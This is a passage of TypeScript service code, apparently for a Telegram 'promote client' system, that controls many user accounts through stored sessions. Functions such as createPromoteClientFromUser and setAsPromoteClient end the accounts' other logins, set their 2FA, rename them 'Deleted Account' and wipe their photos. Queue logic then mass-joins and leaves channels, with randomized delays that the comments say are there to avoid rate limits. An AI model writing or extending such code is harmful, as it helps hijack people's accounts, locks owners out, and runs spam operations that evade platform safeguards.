functioning properly'): Promise<PromoteClient> {\n        return this.updateStatus(mobile, 'active', message);\n    }\n\n    async createOrUpdate(\n        mobile: string,\n        createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto,\n    ): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            this.logger.debug(`Updating existing promote client: ${mobile}`);\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            this.logger.debug(`Creating new promote client: ${mobile}`);\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string, message?: string): Promise<void> {\n        try {\n            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);\n\n            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();\n\n            if (deleteResult.deletedCount === 0) {\n                throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n            }\n\n            await fetchWithTimeout(\n                `${notifbot()}&text=${encodeURIComponent(`${process.env.serviceName || process.env.clientId} Deleting Promote Client : ${mobile}\\n${message}`)}`,\n            );\n        } catch (error) {\n            if (error instanceof NotFoundException) {\n                throw error;\n            }\n            const errorDetails = parseError(error);\n            this.logger.error(`[${mobile}] Error removing PromoteClient: ${errorDetails.message}`, errorDetails);\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        }\n        this.logger.log(`[${mobile}] PromoteClient removed successfully`);\n    }\n\n    async search(filter: Partial<PromoteClient>): Promise<PromoteClient[]> {\n        this.logger.debug(`Modified filter:`, filter);\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(\n        query: Record<string, any>,\n        sort?: Record<string, any>,\n        limit?: number,\n        skip?: number,\n    ): Promise<PromoteClient[]> {\n        if (!query) {\n            throw new BadRequestException('Query is invalid.');\n        }\n\n        try {\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n            if (limit) {\n                queryExec.limit(limit);\n            }\n            if (skip) {\n                queryExec.skip(skip);\n            }\n            return await queryExec.exec();\n        } catch (error) {\n            // Re-throw known exceptions, wrap unknown errors\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\n                throw error;\n            }\n            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';\n            throw new InternalServerErrorException(`Query execution failed: ${errorMessage}`);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        const deleted = this.joinChannelMap.delete(key);\n        if (deleted) {\n            this.logger.debug(`Removed ${key} from join channel map`);\n        }\n    }\n\n    clearPromoteMap() {\n        this.logger.debug('PromoteMap cleared');\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n    }\n\n    async updateInfo() {\n        const clients = await this.promoteClientModel\n            .find({ status: 'active', lastChecked: { $lt: new Date(Date.now() - 7 * this.ONE_DAY_MS) } })\n            .sort({ channels: 1 })\n            .limit(25);\n\n        const now = Date.now();\n        for (let i = 0; i < clients.length; i++) {\n            const client = clients[i];\n            const mobile = client?.mobile;\n            this.logger.info(`Processing PromoteClient (${i + 1}/${clients.length}): ${mobile}`);\n            \n            const lastChecked = client.lastChecked \n                ? new Date(client.lastChecked).getTime() \n                : 0;\n            await this.performHealthCheck(mobile, lastChecked, now);\n            \n            // Increased delay to avoid rate limits\n            if (i < clients.length - 1) {\n                await sleep(12000 + Math.random() * 8000); // 12-20 seconds between each client\n            }\n        }\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Active client setup exists, skipping promotion process');\n            return 'Active client setup exists, skipping promotion';\n        }\n\n        this.logger.log('Starting join channel process');\n        this.clearAllMapsAndIntervals();\n\n        await sleep(6000 + Math.random() * 3000); // Increased initial delay to reduce CPU spike\n\n        try {\n            const existingKeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n            const clients = await this.promoteClientModel\n                .find({\n                    channels: { $lt: 350 },\n                    mobile: { $nin: existingKeys },\n                    status: 'active',\n                })\n                .sort({ channels: 1 })\n                .limit(16);\n\n            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);\n\n            const joinSet = new Set<string>();\n            const leaveSet = new Set<string>();\n            let successCount = 0;\n            let failCount = 0;\n\n            for (const document of clients) {\n                const mobile = document.mobile;\n                this.logger.debug(`Processing client: ${mobile}`);\n\n                try {\n                    const client = await connectionManager.getClient(mobile, {\n                        autoDisconnect: false,\n                        handler: false,\n                    });\n\n                    await sleep(5000 + Math.random() * 3000); // 5-8s delay before channel info\n                    const channels = await channelInfo(client.client, true);\n                    this.logger.debug(`[${mobile}]: Found ${channels.ids.length} existing channels`);\n                    await sleep(5000 + Math.random() * 3000); // 5-8s delay before update\n                    await this.update(mobile, { channels: channels.ids.length });\n\n                    if (channels.ids.length > 100) {\n                        await sleep(5000 + Math.random() * 3000); // Delay before profile pic operations\n                        const profilePics = await getProfilePics(client.client);\n                        if (profilePics.length > 0) {\n                            await deleteProfilePhotos(client.client, profilePics);\n                            await sleep(10000 + Math.random() * 5000); // Delay after deletion\n                        }\n                    }\n\n                    if (channels.canSendFalseCount < 10) {\n                        const excludedIds = channels.ids;\n                        const channelLimit = 150;\n                        await sleep(5000 + Math.random() * 3000); // Increased delay before getting channels\n                        const isBelowThreshold = channels.ids.length < 220;\n\n                        const result: (Channel | ActiveChannel)[] = isBelowThreshold\n                            ? await this.activeChannelsService.getActiveChannels(channelLimit, 0, excludedIds)\n                            : await this.channelsService.getActiveChannels(channelLimit, 0, excludedIds);\n\n                        if (!this.joinChannelMap.has(mobile)) {\n                            this.joinChannelMap.set(mobile, result);\n                            this.trimMapIfNeeded(this.joinChannelMap, 'joinChannelMap'); // Trim after add\n                            joinSet.add(mobile);\n                        } else {\n                            this.logger.debug(`[${mobile}]: Already in join queue, skipping re-add`);\n                        }\n                        await this.sessionService.getOldestSessionOrCreate({ mobile: document.mobile });\n                    } else {\n                        this.logger.debug(`[${mobile}]: Too many blocked channels (${channels.canSendFalseCount}), preparing for leave`);\n                        if (!this.leaveChannelMap.has(mobile)) {\n                            this.leaveChannelMap.set(mobile, channels.canSendFalseChats);\n                            this.trimMapIfNeeded(this.leaveChannelMap, 'leaveChannelMap'); // Trim after add\n                            leaveSet.add(mobile);\n                        } else {\n                            this.logger.debug(`[${mobile}]: Already in leave queue, skipping re-add`);\n                        }\n                    }\n\n                    successCount++;\n                } catch (error) {\n                    failCount++;\n                    const errorDetails = parseError(error);\n                    this.logger.error(`[${mobile}] Error processing client:`, errorDetails);\n                    if (isPermanentError(errorDetails)) {\n                        await sleep(1000);\n                        await this.markAsInactive(mobile, `${errorDetails.message}`);\n                    } else {\n                        this.logger.warn(`[${mobile}]: Non-fatal error encountered, will retry later`);\n                    }\n                } finally {\n                    await this.safeUnregisterClient(mobile);\n                    // Progressive delay between clients to prevent rate limits\n                    await sleep(8000 + Math.random() * 5000); // 8-13s delay between clients\n                }\n            }\n\n            await sleep(6000 + Math.random() * 3000); // Increased delay before starting queues\n\n            if (joinSet.size > 0) {\n                this.startMemoryCleanup();\n                this.logger.debug(`Starting join queue for ${joinSet.size} clients`);\n                this.createTimeout(() => this.joinChannelQueue(), 2000);\n            }\n\n            if (leaveSet.size > 0) {\n                this.logger.debug(`Starting leave queue for ${leaveSet.size} clients`);\n                this.createTimeout(() => this.leaveChannelQueue(), 5000);\n            }\n\n            this.logger.log(`Join channel process completed for ${clients.length} clients (Success: ${successCount}, Failed: ${failCount})`);\n            return `Initiated Joining channels for ${joinSet.size} | Queued for leave: ${leaveSet.size}`;\n        } catch (error) {\n            this.logger.error('Unexpected error during joinchannelForPromoteClients:', error);\n            this.clearAllMapsAndIntervals();\n            throw new Error('Failed to initiate channel joining process');\n        }\n    }\n    private clearAllMapsAndIntervals(): void {\n        this.joinChannelMap.clear();\n        this.leaveChannelMap.clear();\n        this.clearJoinChannelInterval();\n        this.clearLeaveChannelInterval();\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing) {\n            this.logger.warn('Join channel process is already running');\n            return;\n        }\n\n        if (this.joinChannelMap.size === 0) {\n            this.logger.debug('No channels to join, not starting queue');\n            return;\n        }\n\n        if (!this.joinChannelIntervalId) {\n            this.logger.debug('Starting join channel interval');\n            this.joinChannelIntervalId = setInterval(async () => {\n                await this.processJoinChannelInterval();\n            }, this.JOIN_CHANNEL_INTERVAL);\n            this.activeTimeouts.add(this.joinChannelIntervalId);\n            await this.processJoinChannelInterval();\n        } else {\n            this.logger.warn('Join channel interval is already running');\n        }\n    }\n\n    private async processJoinChannelInterval() {\n        if (this.isJoinChannelProcessing) {\n            this.logger.debug('Join channel process already running, skipping interval');\n            return;\n        }\n\n        if (this.joinChannelMap.size === 0) {\n            this.logger.debug('No channels to join, clearing interval');\n            this.clearJoinChannelInterval();\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n\n        try {\n            await this.processJoinChannelSequentially();\n        } catch (error) {\n            this.logger.error('Error in join channel queue', error);\n        } finally {\n            this.isJoinChannelProcessing = false;\n            if (this.joinChannelMap.size === 0) {\n                this.clearJoinChannelInterval();\n            }\n        }\n    }\n\n    private async processJoinChannelSequentially() {\n        const keys = Array.from(this.joinChannelMap.keys());\n        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);\n\n        for (let i = 0; i < keys.length; i++) {\n            const mobile = keys[i];\n            let currentChannel: Channel | ActiveChannel | null = null;\n\n            try {\n                const channels = this.joinChannelMap.get(mobile);\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);\n                    this.removeFromPromoteMap(mobile);\n                    continue;\n                }\n\n                currentChannel = channels.shift();\n                if (!currentChannel) {\n                    this.logger.debug(`No channel to process for ${mobile}, removing from queue`);\n                    this.removeFromPromoteMap(mobile);\n                    continue;\n                }\n                this.logger.debug(`[${mobile}] Processing channel: @${currentChannel.username} (${channels.length} remaining)`);\n                this.joinChannelMap.set(mobile, channels);\n\n                let activeChannel = null;\n                try {\n                    activeChannel = await this.activeChannelsService.findOne(currentChannel.channelId);\n                } catch (findError) {\n                    this.logger.warn(`Error fetching active channel ${currentChannel.channelId}:`, findError);\n                }\n\n                // Check for banned, deleted, or null\n                if (!activeChannel || activeChannel.banned || (activeChannel.deletedCount && activeChannel.deletedCount > 0)) {\n                    this.logger.debug(`Skipping invalid/banned/deleted channel ${currentChannel.channelId}`);\n                    // Still add delay even when skipping to maintain rate limiting\n                    await sleep(5000 + Math.random() * 3000);\n                    continue;\n                }\n\n                await this.telegramService.tryJoiningChannel(mobile, currentChannel);\n            } catch (error: any) {\n                const errorDetails = parseError(\n                    error,\n                    `[${mobile}] ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error: `,\n                    false,\n                );\n\n                if (\n                    errorDetails.error === 'FloodWaitError' ||\n                    error.errorMessage === 'CHANNELS_TOO_MUCH'\n                ) {\n                    this.logger.warn(`[${mobile}] FloodWaitError or too many channels, removing from queue`);\n                    this.removeFromPromoteMap(mobile);\n\n                    await sleep(10000 + Math.random() * 5000); // Increased delay on FloodWaitError\n                    if (error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                        await this.update(mobile, { channels: 400 });\n                    } else {\n                        const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                        await this.update(mobile, { channels: channelsInfo.ids.length });\n                    }\n                }\n\n                if (isPermanentError(errorDetails)) {\n                    this.removeFromPromoteMap(mobile);\n                    await this.markAsInactive(mobile, `${errorDetails.message}`);\n                }\n            } finally {\n                await this.safeUnregisterClient(mobile);\n\n                if (\n                    i < keys.length - 1 ||\n                    this.joinChannelMap.get(mobile)?.length > 0\n                ) {\n                    await sleep(this.CHANNEL_PROCESSING_DELAY);\n                }\n            }\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug(`Clearing join channel interval`);\n            clearInterval(this.joinChannelIntervalId);\n            this.activeTimeouts.delete(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n        }\n        this.isJoinChannelProcessing = false;\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        const mapSize = this.leaveChannelMap.size;\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing) {\n            this.logger.warn('Leave channel process is already running');\n            return;\n        }\n\n        if (this.leaveChannelMap.size === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        if (!this.leaveChannelIntervalId) {\n            this.logger.debug('Starting leave channel interval');\n            this.leaveChannelIntervalId = setInterval(async () => {\n                await this.processLeaveChannelInterval();\n            }, this.LEAVE_CHANNEL_INTERVAL);\n            this.activeTimeouts.add(this.leaveChannelIntervalId);\n            await this.processLeaveChannelInterval();\n        } else {\n            this.logger.warn('Leave channel interval is already running');\n        }\n    }\n\n    private async processLeaveChannelInterval() {\n        if (this.isLeaveChannelProcessing) {\n            this.logger.debug('Leave channel process already running, skipping interval');\n            return;\n        }\n\n        if (this.leaveChannelMap.size === 0) {\n            this.logger.debug('No channels to leave, clearing interval');\n            this.clearLeaveChannelInterval();\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n\n        try {\n            await this.processLeaveChannelSequentially();\n        } catch (error) {\n            this.logger.error('Error in leave channel queue', error);\n        } finally {\n            this.isLeaveChannelProcessing = false;\n            if (this.leaveChannelMap.size === 0) {\n                this.clearLeaveChannelInterval();\n            }\n        }\n    }\n\n    private async processLeaveChannelSequentially() {\n        const keys = Array.from(this.leaveChannelMap.keys());\n        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);\n\n        for (let i = 0; i < keys.length; i++) {\n            const mobile = keys[i];\n\n            try {\n                const channels = this.leaveChannelMap.get(mobile);\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);\n                    this.removeFromLeaveMap(mobile);\n                    continue;\n                }\n\n                const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);\n                this.logger.debug(`[${mobile}] Processing ${channelsToProcess.length} channels to leave (${channels.length} remaining)`);\n\n                if (channels.length > 0) {\n                    this.leaveChannelMap.set(mobile, channels);\n                } else {\n                    this.removeFromLeaveMap(mobile);\n                }\n\n                const client = await connectionManager.getClient(mobile, {\n                    autoDisconnect: false,\n                    handler: false,\n                });\n\n                await sleep(5000 + Math.random() * 3000); // Increased delay before leaving channels\n                await client.leaveChannels(channelsToProcess);\n                this.logger.debug(`[${mobile}] Successfully left ${channelsToProcess.length} channels`);\n            } catch (error: any) {\n                const errorDetails = parseError(error, `[${mobile}] Leave Channel ERR: `, false);\n                if (isPermanentError(errorDetails)) {\n                    await this.markAsInactive(mobile, `${errorDetails.message}`);\n                    this.removeFromLeaveMap(mobile);\n                } else {\n                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);\n                }\n            } finally {\n                await this.safeUnregisterClient(mobile);\n\n                if (\n                    i < keys.length - 1 ||\n                    this.leaveChannelMap.get(mobile)?.length > 0\n                ) {\n                    await sleep((this.LEAVE_CHANNEL_INTERVAL / 2) + Math.random() * 30000); // Add randomness to delay\n                }\n            }\n        }\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.activeTimeouts.delete(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n    }\n\n    private async safeUnregisterClient(mobile: string): Promise<void> {\n        try {\n            await connectionManager.unregisterClient(mobile);\n        } catch (unregisterError: unknown) {\n            const errorMessage = unregisterError instanceof Error ? unregisterError.message : 'Unknown error';\n            this.logger.error(`Error unregistering client ${mobile}: ${errorMessage}`);\n        }\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = ClientHelperUtils.getTodayDateString(),\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('User not found');\n        }\n\n        const isExist = await this.findOne(mobile, false);\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exists');\n        }\n\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map((client) => client?.mobile);\n\n        // Check if mobile is already an active client\n        if (clientMobiles.includes(mobile)) {\n            throw new BadRequestException('Number is an Active Client');\n        }\n\n        // If we reach here, promote client doesn't exist (checked above) and mobile is not an active client\n        const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });\n        try {\n            await telegramClient.set2fa();\n            await sleep(30000 + Math.random() * 30000); // 30-60s delay for 2FA setup\n            await sleep(5000 + Math.random() * 5000); // Delay before username update\n            await telegramClient.updateUsername('');\n            await sleep(10000 + Math.random() * 5000); // 10-15s delay after username\n            await telegramClient.updatePrivacyforDeletedAccount();\n            await sleep(10000 + Math.random() * 5000); // 10-15s delay after privacy\n            await telegramClient.updateProfile('Deleted Account', 'Deleted Account');\n            await sleep(10000 + Math.random() * 5000); // 10-15s delay after profile\n            await telegramClient.deleteProfilePhotos();\n            await sleep(10000 + Math.random() * 5000); // 10-15s delay after photo deletion\n            const channels = await this.telegramService.getChannelInfo(mobile, true);\n\n            const promoteClient = {\n                tgId: user.tgId,\n                lastActive: 'default',\n                mobile: user.mobile,\n                availableDate,\n                channels: channels.ids.length,\n                status: 'active',\n                message: 'Manually configured as promote client',\n                lastUsed: null,\n            };\n\n            await this.promoteClientModel\n                .findOneAndUpdate(\n                    { mobile: user.mobile },\n                    { $set: promoteClient },\n                    { new: true, upsert: true },\n                )\n                .exec();\n        } catch (error) {\n            const errorDetails = parseError(error);\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        } finally {\n            await this.safeUnregisterClient(mobile);\n        }\n        return 'Client set as promote successfully';\n    }\n\n    /**\n     * Helper to safely get timestamp from date field\n     */\n\n    /**\n     * Helper method to update user 2FA status\n     * Handles errors gracefully with consistent logging\n     */\n    private async updateUser2FAStatus(tgId: string, mobile: string): Promise<void> {\n        try {\n            await this.usersService.update(tgId, { twoFA: true });\n        } catch (userUpdateError) {\n            this.logger.warn(`Failed to update user 2FA status for ${mobile}:`, userUpdateError);\n        }\n    }\n\n    /**\n     * Helper method for consistent error handling\n     * Parses errors and returns standardized error details\n     */\n    private handleError(error: unknown, context: string, mobile?: string): ReturnType<typeof parseError> {\n        const contextWithMobile = mobile ? `${context}: ${mobile}` : context;\n        return parseError(error, contextWithMobile, false);\n    }\n\n    /**\n     * Calculate availability-based promote client needs for a specific client\n     * Checks availability across multiple time windows (today, tomorrow, 1 week, 10 days)\n     * Returns how many new promote clients are needed to maintain minimum availability\n     * \n     * Key: availableDate means \"available from\" - client is available on/after that date\n     * \n     * @param clientId - Client ID to calculate needs for\n     * @returns Object with total needed, window details, and calculation reason\n     */\n    private async calculateAvailabilityBasedNeeds(\n        clientId: string\n    ): Promise<{\n        totalNeeded: number;\n        windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;\n        totalActive: number;\n        totalNeededForCount: number;\n        calculationReason: string;\n        priority: number;\n    }> {\n        const today = new Date();\n        today.setHours(0, 0, 0, 0);\n        const todayStr = today.toISOString().split('T')[0];\n        \n        const windows = this.AVAILABILITY_WINDOWS.map(window => ({\n            ...window,\n            targetDate: new Date(today.getTime() + window.days * this.ONE_DAY_MS)\n                .toISOString().split('T')[0]\n        }));\n\n        // Get total active count\n        const totalActive = await this.promoteClientModel.countDocuments({\n            clientId,\n            status: 'active'\n        });\n\n        const windowNeeds = [];\n        let maxNeeded = 0;\n        let mostUrgentWindow = '';\n        let mostUrgentPriority = 999;\n\n        for (const window of windows) {\n            // Count how many promote clients are available on or before this window's date\n            // Key: availableDate <= targetDate means available on/after that date\n            const availableCount = await this.promoteClientModel.countDocuments({\n                clientId,\n                status: 'active',\n                availableDate: { $lte: window.targetDate } // Available on/after this date\n            });\n\n            const needed = Math.max(0, window.minRequired - availableCount);\n            \n            windowNeeds.push({\n                window: window.name,\n                available: availableCount,\n                needed,\n                targetDate: window.targetDate,\n                minRequired: window.minRequired\n            });\n\n            // Track which window needs the most and is most urgent\n            if (needed > maxNeeded) {\n                maxNeeded = needed;\n                mostUrgentWindow = window.name;\n                mostUrgentPriority = window.days;\n            } else if (needed > 0 && window.days < mostUrgentPriority) {\n                // If same need level, prioritize more urgent window\n                mostUrgentWindow = window.name;\n                mostUrgentPriority = window.days;\n            }\n        }\n\n        // Check total count requirement\n        const totalNeededForCount = Math.max(0, this.MIN_TOTAL_PROMOTE_CLIENTS - totalActive);\n\n        // Calculate total needed: max of window needs OR total count needs\n        const totalNeeded = Math.max(maxNeeded, totalNeededForCount);\n\n        // Calculate priority: most urgent window that needs clients, or 100 if only count needed\n        let priority = 100; // Default: low priority (only count needed)\n        if (maxNeeded > 0) {\n            priority = mostUrgentPriority; // Use days of most urgent window (0=today, 1=tomorrow, etc.)\n        }\n\n        // Build calculation reason for logging\n        let calculationReason = '';\n        if (maxNeeded > 0 && totalNeededForCount > 0) {\n            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded}, total count needs ${totalNeededForCount}`;\n        } else if (maxNeeded > 0) {\n            const windowConfig = this.AVAILABILITY_WINDOWS.find(w => w.name === mostUrgentWindow);\n            calculationReason = `Window '${mostUrgentWindow}' needs ${maxNeeded} to meet minimum of ${windowConfig?.minRequired || 'unknown'}`;\n        } else if (totalNeededForCount > 0) {\n            calculationReason = `Total count needs ${totalNeededForCount} to reach minimum of ${this.MIN_TOTAL_PROMOTE_CLIENTS}`;\n        } else {\n            calculationReason = 'All windows satisfied';\n        }\n\n        return { \n            totalNeeded, \n            windowNeeds,\n            totalActive,\n            totalNeededForCount,\n            calculationReason,\n            priority\n        };\n    }\n\n    /**\n     * Create backfill timestamps for old documents\n     */\n\n    /**\n     * Create a promote client from a user document\n     * @param document - User document with mobile and tgId\n     * @param targetClientId - Client ID to assign the promote client to\n     * @param availableDate - Optional availableDate (defaults to today for immediate availability)\n     * @returns true if created successfully, false otherwise\n     */\n    private async createPromoteClientFromUser(\n        document: { mobile: string; tgId: string },\n        targetClientId: string,\n        availableDate?: string // Optional - defaults to today\n    ): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(document.mobile, {\n            autoDisconnect: false,\n        });\n\n        try {\n            // Check password\n            const hasPassword = await telegramClient.hasPassword();\n            this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);\n\n            if (hasPassword) {\n                this.logger.debug(`Failed to Update as PromoteClient as ${document.mobile} already has Password`);\n                await this.updateUser2FAStatus(document.tgId, document.mobile);\n                return false;\n            }\n\n            // Setup 2FA\n            await telegramClient.removeOtherAuths();\n            await sleep(10000 + Math.random() * 10000);\n            await telegramClient.set2fa();\n            this.logger.debug('Waiting for setting 2FA');\n            await sleep(30000 + Math.random() * 30000);\n            \n            // Get channel info\n            const channels = await channelInfo(telegramClient.client, true);\n            await sleep(5000 + Math.random() * 5000);\n            \n            // Use provided availableDate or default to today\n            const targetAvailableDate = availableDate || ClientHelperUtils.getTodayDateString();\n            this.logger.debug(`Inserting Document for client ${targetClientId} with availableDate ${targetAvailableDate}`);\n            \n            const promoteClient: CreatePromoteClientDto = {\n                tgId: document.tgId,\n                lastActive: 'today',\n                mobile: document.mobile,\n                availableDate: targetAvailableDate,\n                channels: channels.ids.length,\n                clientId: targetClientId,\n                status: 'active',\n                message: 'Account successfully configured as promote client',\n                lastUsed: null,\n            };\n            \n            await this.create(promoteClient);\n            await this.updateUser2FAStatus(document.tgId, document.mobile);\n            this.logger.log(`Created PromoteClient for ${targetClientId} with availability ${targetAvailableDate}`);\n            return true;\n        } catch (error: unknown) {\n            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);\n            this.logger.error(`Error processing promote client ${document.mobile}: ${errorDetails.message}`);\n            if (isPermanentError(errorDetails)) {\n                try {\n                    await this.markAsInactive(document.mobile, errorDetails.message);\n                } catch (markError) {\n                    this.logger.error(`Failed to mark ${document.mobile} as inactive:`, markError);\n                }\n            }\n            return false;\n        } finally {\n            await this.safeUnregisterClient(document.mobile);\n            await sleep(10000 + Math.random() * 5000);\n        }\n    }\n\n    /**\n     * Backfill missing timestamp fields for clients that have been used\n     */\n    private async backfillTimestamps(mobile: string, doc: PromoteClient, now: number): Promise<void> {\n        const needsBackfill = !doc.privacyUpdatedAt || !doc.profilePicsDeletedAt ||\n            !doc.nameBioUpdatedAt || !doc.usernameUpdatedAt ||\n            !doc.profilePicsUpdatedAt;\n\n        if (!needsBackfill) return;\n\n        this.logger.log(`Backfilling timestamp fields for ${mobile}`);\n\n        const allTimestamps = ClientHelperUtils.createBackfillTimestamps(now, this.ONE_DAY_MS);\n        const backfillData: UpdatePromoteClientDto = {};\n\n        if (!doc.privacyUpdatedAt) backfillData.privacyUpdatedAt = allTimestamps.privacyUpdatedAt;\n        if (!doc.profilePicsDeletedAt) backfillData.profilePicsDeletedAt = allTimestamps.profilePicsDeletedAt;\n        if (!doc.nameBioUpdatedAt) backfillData.nameBioUpdatedAt = allTimestamps.nameBioUpdatedAt;\n        if (!doc.usernameUpdatedAt) backfillData.usernameUpdatedAt = allTimestamps.usernameUpdatedAt;\n        if (!doc.profilePicsUpdatedAt) backfillData.profilePicsUpdatedAt = allTimestamps.profilePicsUpdatedAt;\n\n        await this.update(mobile, backfillData);\n        this.logger.log(`Backfilled ${Object.keys(backfillData).length} timestamp fields for ${mobile}`);\n    }\n\n    /**\n     * Perform health check on a promote client\n     * Verifies account is still alive and updates lastChecked\n     * @param mobile - Client mobile number\n     * @param lastChecked - Timestamp of last health check (0 if never checked)\n     * @param now - Current timestamp\n     * @returns true if health check passed, false otherwise\n     */\n    private async performHealthCheck(mobile: string, lastChecked: number, now: number): Promise<boolean> {\n        const needsHealthCheck = !lastChecked || (now - lastChecked > 7 * this.ONE_DAY_MS);\n\n        if (!needsHealthCheck) {\n            return true; // Health check not needed yet\n        }\n\n        try {\n            const telegramClient = await connectionManager.getClient(mobile, {\n                autoDisconnect: false,\n                handler: false,\n            });\n            await telegramClient.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [new Api.InputPrivacyValueDisallowAll()],\n                })\n            );\n            const channels = await channelInfo(telegramClient.client, true);\n            await this.update(mobile, {\n                channels: channels.ids.length,\n                lastChecked: new Date()\n            });\n            this.logger.debug(`Health check passed for ${mobile}`);\n            await sleep(5000);\n            return true;\n        } catch (error) {\n            const errorDetails = this.handleError(error, 'Health check failed', mobile);\n            this.logger.warn(`Health check failed for ${mobile}: ${errorDetails.message}`);\n            if (isPermanentError(errorDetails)) {\n                await this.markAsInactive(mobile, `Health check failed: ${errorDetails.message}`);\n            }\n            await sleep(5000)\n            return false;\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n    /**\n     * Check which updates are pending for a promote client\n     */\n    private getPendingUpdates(doc: PromoteClient, now: number): {\n        needsPrivacy: boolean;\n        needsDeletePhotos: boolean;\n        needsNameBio: boolean;\n        needsUsername: boolean;\n        needsProfilePhotos: boolean;\n        totalPending: number;\n        reasons: string[];\n    } {\n        const accountAge = doc.createdAt ? now - new Date(doc.createdAt).getTime() : 0;\n        const DAY = this.ONE_DAY_MS;\n        const MIN_DAYS_BETWEEN_UPDATES = DAY;\n        const reasons: string[] = [];\n\n        // Privacy update - accounts 1-30 days old, not updated in last 15 days\n        const privacyTimestamp = ClientHelperUtils.getTimestamp(doc.privacyUpdatedAt);\n        const needsPrivacy = accountAge >= DAY && accountAge <= 30 * DAY &&\n            (privacyTimestamp === 0 || privacyTimestamp < now - 15 * DAY);\n        if (needsPrivacy) reasons.push('Privacy update needed');\n\n        // Delete photos - needs privacy done at least 1 day ago\n        const privacyDone = privacyTimestamp > 0 && (now - privacyTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const photosDeletedTimestamp = ClientHelperUtils.getTimestamp(doc.profilePicsDeletedAt);\n        const needsDeletePhotos = accountAge >= 2 * DAY && accountAge <= 30 * DAY &&\n            (photosDeletedTimestamp === 0 || photosDeletedTimestamp < now - 30 * DAY) &&\n            (privacyDone || privacyTimestamp === 0);\n        if (needsDeletePhotos) reasons.push('Delete photos needed');\n\n        // Name/Bio - needs photos deleted at least 1 day ago, 100+ channels\n        const photosDone = photosDeletedTimestamp > 0 && (now - photosDeletedTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const nameBioTimestamp = ClientHelperUtils.getTimestamp(doc.nameBioUpdatedAt);\n        const needsNameBio = accountAge >= 3 * DAY && accountAge <= 30 * DAY &&\n            (doc.channels || 0) > 100 &&\n            (nameBioTimestamp === 0 || nameBioTimestamp < now - 30 * DAY) &&\n            (photosDone || photosDeletedTimestamp === 0);\n        if (needsNameBio) reasons.push('Name/Bio update needed');\n\n        // Username - needs name/bio done at least 1 day ago, 150+ channels\n        const nameBioDone = nameBioTimestamp > 0 && (now - nameBioTimestamp >= MIN_DAYS_BETWEEN_UPDATES);\n        const usernameTimestamp = ClientHelperUtils.getTimestamp(doc.usernameUpdatedAt);\n        const needsUsername = accountAge >= 7 * DAY && accountAge <= 30 * DAY &&\n            (doc.channels || 0) > 150 &&\n            (usernameTimestamp === 0 || usernameTimestamp < now - 30 * DAY) &&\n            (nameBioDone || nameBioTimestamp === 0);\n        if (needsUsername) 